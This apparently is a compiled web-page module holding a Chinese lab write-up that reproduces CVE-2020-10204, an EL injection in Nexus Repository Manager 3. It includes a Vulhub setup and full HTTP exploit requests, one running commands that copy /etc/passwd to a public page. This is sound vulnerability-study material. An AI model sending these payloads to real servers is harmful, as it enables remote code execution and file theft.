import{_ as a}from"./plugin-vue_export-helper-c27b6911.js";import{r as s,o as u,c as r,a as e,b as t,d as i,e as n}from"./app-58e4a7d6.js";const d={},l=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),t(" 漏洞描述")],-1),c=e("p",null,"Nexus Repository Manager 3 是一款软件仓库，可以用来存储和分发Maven、NuGET等软件源仓库。其3.21.1及之前版本中，存在一处任意EL表达式注入漏洞，这个漏洞是CVE-2018-16621的绕过。",-1),p=e("p",null,"参考链接：",-1),m={href:"https://support.sonatype.com/hc/en-us/articles/360044356194-CVE-2020-10204-Nexus-Repository-Manager-3-Remote-Code-Execution-2020-03-31",target:"_blank",rel:"noopener noreferrer"},v={href:"https://github.com/threedr3am/learnjavabug/blob/93d57c4283/nexus/CVE-2020-10204/README.md",target:"_blank",rel:"noopener noreferrer"},q=n(`<h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>Nexus &lt; 3.21.1
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub执行如下命令启动Nexus Repository Manager 3.21.1：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>等待一段时间环境才能成功启动，访问<code>http://your-ip:8081</code>即可看到Web页面。</p><p>该漏洞需要访问更新角色或创建角色接口，所以我们需要使用账号密码<code>admin:admin</code>登录后台。</p><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>登录后台后，复制当前Cookie和CSRF Token，发送如下数据包，即可执行EL表达式：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /service/extdirect HTTP/1.1
Host: your-vps-ip:8081
Content-Length: 223
X-Requested-With: XMLHttpRequest
X-Nexus-UI: true
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36
NX-ANTI-CSRF-TOKEN: 0.9514072635504696
Content-Type: application/json
Accept: */*
Origin: http://your-vps-ip:8081
Referer: http://your-vps-ip:8081/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: NX-ANTI-CSRF-TOKEN=0.9514072635504696; NXSESSIONID=9c8acd44-38cb-4a2c-a045-96161193dbc2

{&quot;action&quot;:&quot;coreui_User&quot;,&quot;method&quot;:&quot;update&quot;,&quot;data&quot;:[{&quot;userId&quot;:&quot;admin&quot;,&quot;version&quot;:&quot;2&quot;,&quot;firstName&quot;:&quot;admin&quot;,&quot;lastName&quot;:&quot;User&quot;,&quot;email&quot;:&quot;admin@example.org&quot;,&quot;status&quot;:&quot;active&quot;,&quot;roles&quot;:[&quot;nxadmin$\\\\B{233*233}&quot;]}],&quot;type&quot;:&quot;rpc&quot;,&quot;tid&quot;:11}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202281610135.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,11),h={href:"https://github.com/jas502n/CVE-2020-10199%EF%BC%8C%E4%BD%BF%E7%94%A8%E8%A1%A8%E8%BE%BE%E5%BC%8F%60$%5C%5CA",class:"getClass().forName('java.lang.Runtime').getMethods()[6].invoke(null).exec('touch","tmpawesome_poc)":"",target:"_blank",rel:"noopener noreferrer"},b=n(`<figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202281613307.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>命令<code>touch /tmp/awesome_poc</code>执行成功：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202281613913.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>另一处漏洞点：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /service/extdirect HTTP/1.1
Host: 
accept: application/json
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36
NX-ANTI-CSRF-TOKEN: 0.856555763510765
Content-Type: application/json
Cookie: jenkins-timestamper-offset=-28800000; Hm_lvt_8346bb07e7843cd10a2ee33017b3d627=1583249520; NX-ANTI-CSRF-TOKEN=0.856555763510765; NXSESSIONID=e9d6620d-6843-49a6-a887-cd7cef74d413
Content-Length: 304

{&quot;action&quot;:&quot;coreui_Role&quot;,&quot;method&quot;:&quot;create&quot;,&quot;data&quot;:[{&quot;version&quot;:&quot;&quot;,&quot;source&quot;:&quot;default&quot;,&quot;id&quot;:&quot;1111&quot;,&quot;name&quot;:&quot;2222&quot;,&quot;description&quot;:&quot;3333&quot;,&quot;privileges&quot;:[&quot;$\\\\A{&#39;&#39;.getClass().forName(&#39;java.lang.Runtime&#39;).getMethods()[6].invoke(null).exec(&#39;cp /etc/passwd ./public/vuln.html&#39;)}&quot;],&quot;roles&quot;:[]}],&quot;type&quot;:&quot;rpc&quot;,&quot;tid&quot;:89}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,5);function g(_,x){const o=s("ExternalLinkIcon");return u(),r("div",null,[l,c,p,e("ul",null,[e("li",null,[e("a",m,[t("https://support.sonatype.com/hc/en-us/articles/360044356194-CVE-2020-10204-Nexus-Repository-Manager-3-Remote-Code-Execution-2020-03-31"),i(o)])]),e("li",null,[e("a",v,[t("https://github.com/threedr3am/learnjavabug/blob/93d57c4283/nexus/CVE-2020-10204/README.md"),i(o)])])]),q,e("p",null,[t("参考"),e("a",h,[t("https://github.com/jas502n/CVE-2020-10199，使用表达式`$\\\\A"),i(o)]),t("`即可成功执行任意命令：")]),b])}const N=a(d,[["render",g],["__file","Nexus Repository Manager 3 extdirect 远程命令执行漏洞 CVE-2020-10204.html.vue"]]);export{N as default};
